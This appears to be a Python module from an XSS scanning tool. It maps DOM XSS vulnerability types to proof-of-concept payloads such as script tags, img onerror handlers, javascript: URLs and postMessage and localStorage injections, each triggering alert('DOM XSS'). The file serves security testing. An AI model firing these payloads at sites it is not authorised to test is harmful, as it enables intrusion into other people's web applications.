#!/usr/bin/env python3

"""
BRS-XSS Payload Generator

Generation of test payloads for DOM XSS vulnerabilities.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Modified: Sat 02 Aug 2025 09:35:54 MSK
Telegram: https://t.me/EasyProTech
"""

from .vulnerability_types import VulnerabilityType
from .data_models import DOMVulnerability


class PayloadGenerator:
    """Payload generator for DOM XSS"""
    
    @staticmethod
    def generate_payload(vulnerability: DOMVulnerability) -> str:
        """
        Generate payload for vulnerability.
        
        Args:
            vulnerability: Vulnerability
            
        Returns:
            Generated payload
        """
        
        vuln_type = vulnerability.vulnerability_type
        
        if vuln_type == VulnerabilityType.DIRECT_ASSIGNMENT:
            return PayloadGenerator._generate_direct_payload()
        
        elif vuln_type == VulnerabilityType.PROPERTY_INJECTION:
            return PayloadGenerator._generate_property_payload()
        
        elif vuln_type == VulnerabilityType.EVENT_HANDLER:
            return PayloadGenerator._generate_event_payload()
        
        elif vuln_type == VulnerabilityType.URL_MANIPULATION:
            return PayloadGenerator._generate_url_payload()
        
        elif vuln_type == VulnerabilityType.POSTMESSAGE_XSS:
            return PayloadGenerator._generate_postmessage_payload()
        
        elif vuln_type == VulnerabilityType.STORAGE_XSS:
            return PayloadGenerator._generate_storage_payload()
        
        else:
            return PayloadGenerator._generate_generic_payload()
    
    @staticmethod
    def _generate_direct_payload() -> str:
        return '<script>alert("DOM XSS")</script>'
    
    @staticmethod
    def _generate_property_payload() -> str:
        return '<img src=x onerror=alert("DOM XSS")>'
    
    @staticmethod
    def _generate_event_payload() -> str:
        return 'javascript:alert("DOM XSS")'
    
    @staticmethod
    def _generate_url_payload() -> str:
        return '#<script>alert("DOM XSS")</script>'
    
    @staticmethod
    def _generate_postmessage_payload() -> str:
        return '{"type":"xss","data":"<script>alert(\\"DOM XSS\\")</script>"}'
    
    @staticmethod
    def _generate_storage_payload() -> str:
        return '<script>localStorage.setItem("xss","<script>alert(\\"DOM XSS\\")</script>");</script>'
    
    @staticmethod
    def _generate_generic_payload() -> str:
        return 'javascript:alert("DOM XSS")'